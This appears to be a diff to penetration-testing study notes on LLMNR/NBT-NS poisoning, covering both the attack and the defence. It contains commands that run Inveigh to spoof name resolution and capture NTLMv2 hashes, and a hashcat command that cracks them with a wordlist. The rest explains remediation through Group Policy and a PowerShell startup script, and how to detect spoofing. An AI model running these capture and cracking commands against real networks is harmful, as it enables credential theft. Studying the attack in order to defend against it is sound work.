@@ -66,5 +66,110 @@ Let's walk through a quick example of the attack flow at a very high level:
  hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt 
 ```
 
+### LLMNR/NBT-NS Poisoning - from Windows
+
+* [inveigh.md](inveigh.md "mention")
+* Let's start Inveigh with LLMNR and NBNS spoofing, and output to the console and write to a file.
+
+```powershell-session
+Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+```
+
+```
+cat Inveigh-NTLMv2.txt |clip
+```
+
+* copy hashes to [Hashcat](app://obsidian.md/Hashcat)and break
+
+```
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt 
+```
 
 
+
+### C# Inveigh (InveighZero)
+
+* [inveighzero.md](inveighzero.md "mention")
+
+
+
+
+
+### Remediation
+
+* &#x20;To ensure that these spoofing attacks are not possible, we can disable LLMNR and NBT-NS
+* We can disable LLMNR in Group Policy by going to Computer Configuration --> Administrative Templates --> Network --> DNS Client and enabling "Turn OFF Multicast Name Resolution."
+
+<figure><img src="../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>
+
+* NBT-NS cannot be disabled via Group Policy but must be disabled locally on each host
+  * We can do this by opening `Network and Sharing Center` under `Control Panel`,
+    * clicking on `Change adapter settings`,
+    * right-clicking on the adapter to view its properties,
+    * selecting `Internet Protocol Version 4 (TCP/IPv4)`,
+      * and clicking the `Properties` button,
+      * then clicking on `Advanced`&#x20;
+      * selecting the `WINS` tab
+      * finally selecting `Disable NetBIOS over TCP/IP`.
+
+
+
+
+
+<figure><img src="../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>
+
+
+
+* While it is not possible to disable NBT-NS directly via GPO, we can create a PowerShell script under Computer Configuration --> Windows Settings --> Script (Startup/Shutdown) --> Startup with something like the following:
+
+
+
+```powershell
+$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
+Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
+```
+
+* In the Local Group Policy Editor,
+  * we will need to double click on `Startup`,
+  * choose the `PowerShell Scripts` tab,
+  * select "For this GPO, run scripts in the following order" to `Run Windows PowerShell scripts first`,
+  * then click on `Add` and choose the script.
+  * For these changes to occur, we would have to either reboot the target system or restart the network adapter.
+
+
+
+<figure><img src="../.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>
+
+
+
+* To push this out to all hosts in a domain, we could create a GPO using `Group Policy Management` on the Domain Controller and host the script on the SYSVOL share in the scripts folder and then call it via its UNC path such as:
+
+`\\inlanefreight.local\SYSVOL\INLANEFREIGHT.LOCAL\scripts`
+
+* Once the GPO is applied to specific OUs and those hosts are restarted,
+  * the script will run at the next reboot and disable NBT-NS, provided that the script still exists on the SYSVOL share and is accessible by the host over the network.
+
+
+
+<figure><img src="../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>
+
+
+
+
+
+* Other mitigations include filtering network traffic to block LLMNR/NetBIOS traffic and enabling SMB Signing to prevent NTLM relay attacks.
+* Network intrusion detection and prevention systems can also be used to mitigate this activity, while network segmentation can be used to isolate hosts that require LLMNR or NetBIOS enabled to operate correctly.
+
+### Detection
+
+* One way is to use the attack against the attackers by injecting LLMNR and NBT-NS requests for non-existent hosts across different subnets and alerting if any of the responses receive answers which would be indicative of an attacker spoofing name resolution responses.
+  * This [blog post](https://www.praetorian.com/blog/a-simple-and-effective-way-to-detect-broadcast-name-resolution-poisoning-bnrp/) explains this method more in-depth.
+* Furthermore, hosts can be monitored for traffic on
+  * ports UDP 5355 and 137,
+  * and event IDs [4697](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4697) and [7045](https://www.manageengine.com/products/active-directory-audit/kb/system-events/event-id-7045.html) can be monitored for.
+* Finally, we can monitor the registry key `HKLM\Software\Policies\Microsoft\Windows NT\DNSClient` for changes to the `EnableMulticast` DWORD value.
+  * A value of `0` would mean that LLMNR is disabled.
+
+## Reference
+
+* https://youtu.be/VXxH4n684HE?t=5888
